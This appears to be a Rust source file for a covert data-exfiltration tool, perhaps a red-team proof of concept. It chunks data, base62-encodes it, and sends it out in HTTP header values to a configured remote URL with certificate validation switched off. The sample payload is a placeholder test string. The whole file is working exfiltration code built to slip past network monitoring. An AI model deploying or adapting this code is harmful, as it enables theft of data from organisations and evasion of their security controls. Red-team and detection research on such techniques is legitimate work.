use std::error::Error;
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};

use base62;

mod config {
    include!(concat!(env!("OUT_DIR"), "/config.rs"));
}

fn send_data(encoded_chunk: &str) -> Result<(), Box<dyn Error>> {
    #[cfg(feature = "debug")]
    println!("[\x1b[33m*\x1b[0m] Sending chunk: {}", encoded_chunk);

    let mut headers = HeaderMap::new();
    for (key, value) in config::HEADERS {
        let header_name = HeaderName::from_bytes(key.as_bytes())?;
        let header_value = HeaderValue::from_str(&value.replace("{{PAYLOAD}}", encoded_chunk))?;
        headers.insert(header_name, header_value);
    }

    let client = reqwest::blocking::Client::builder()
        .http1_title_case_headers()
        .default_headers(headers)
        .danger_accept_invalid_certs(true)
        .build()?;

    let _ = client.get(config::TARGET_URL).send()?;

    Ok(())
}

fn exfil_data(payload_bytes: &[u8]) -> Result<(), Box<dyn Error>> {
    const CHUNK_SIZE: usize = 16;

    for chunk in payload_bytes.chunks(CHUNK_SIZE) {
        let mut buffer = [0u8; CHUNK_SIZE];
        buffer[..chunk.len()].copy_from_slice(chunk);
        let num = u128::from_be_bytes(buffer);
        let encoded_chunk = base62::encode(num);

        send_data(&encoded_chunk)?;
    }

    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    let data_to_exfil = "my-secret-test-data-123";

    #[cfg(feature = "debug")]
    println!("[\x1b[33m*\x1b[0m] Exfiltrating data ('{}')...", data_to_exfil);

    if let Err(_e) = exfil_data(data_to_exfil.as_bytes()) {
        #[cfg(feature = "debug")]
        eprintln!("[\x1b[31m!\x1b[0m] Error: {}", _e);
    }

    #[cfg(feature = "debug")]
    println!("[\x1b[32m+\x1b[0m] Done");
    Ok(())
}
